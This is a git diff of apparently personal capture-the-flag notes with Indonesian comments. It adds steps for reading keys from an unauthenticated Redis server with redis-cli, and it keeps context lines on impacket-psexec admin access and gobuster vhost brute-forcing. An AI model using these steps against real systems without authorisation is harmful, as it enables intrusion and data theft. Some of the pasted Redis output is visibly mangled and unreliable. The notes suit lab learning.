@@ -93,7 +93,7 @@ impacket-psexec administrator@{ip}
 now you are an admin
 
 
-80/tcp HTTP
+80/tcp HTTP (Apache HTTPD)
 this mean IP avaiable in web browser and can perform web exploit hack.
 
 5985/tcp (HTTP)
@@ -108,6 +108,26 @@ adding host entry
 add an entry for {link} in the /etc/hosts file with the corresponding IP address to be able
 to access this domain in our browser.
 echo "{ip} {link}" | sudo tee -a /etc/hosts
+
+
+6379/tcp REDIS SERVER (REmote DIctionary Server)
+	redis-cli -h {target_IP}
+	info #Mengecek info server
+
+		# Keyspace (ADA DI INFO)
+		db0:keys=4,expires=0,avg_ttl=0 #HANYA ADA 1 DATABASE DENGAN INDEX 0, CEK AJA
+
+	select 0 #MEMILIH DATABASE DENGAN INDEX 0
+	keys *   #MELIHAT SEMUA KEYS YANG ADA DI DATABASE
+		1) "flag"_allocated:1570200
+		2) "temp"_active:1892352
+		3) "stor"_resident:9101312
+		4) "numb"tem_memory:2084024320
+	get flag (get <key>) #MELIHAT VALUES DARI KEYS
+		"03e1d2b376c37ab3f5319922053953eb"
+		(1.03s)mory_lua_human:41.00K
+
+
 
 gobuster
 vhost : Uses VHOST for brute-forcing
